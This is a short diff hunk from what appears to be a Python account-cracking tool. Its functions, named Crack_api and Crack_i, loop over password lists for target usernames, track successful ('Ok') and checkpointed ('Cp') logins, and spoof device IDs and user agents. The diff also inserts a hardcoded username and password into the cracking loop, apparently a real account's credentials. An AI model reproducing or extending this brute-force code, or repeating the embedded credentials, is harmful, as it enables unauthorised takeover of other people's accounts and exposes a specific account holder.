@@ -848,13 +848,15 @@ def Crack_api(username, kontol):
             continue
     Loop += 1
 
-def Crack_i(usernamee, memek):
+def Crack_i(username, memek):
     global Ok, Cp, Loop
     sys.stdout.write(f"\rStatus IP: {GREEN}Safe{WHITE} api {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
-    for passwordd in memek:
+    for password in memek:
         try:
             uag = UA_OLD()
+            username = 'itz__hari__556'
+            password = '62678121'
             base_ts = int(time.time())
             device_id = str(uuid.uuid4())
             family_device_id = str(uuid.uuid4())
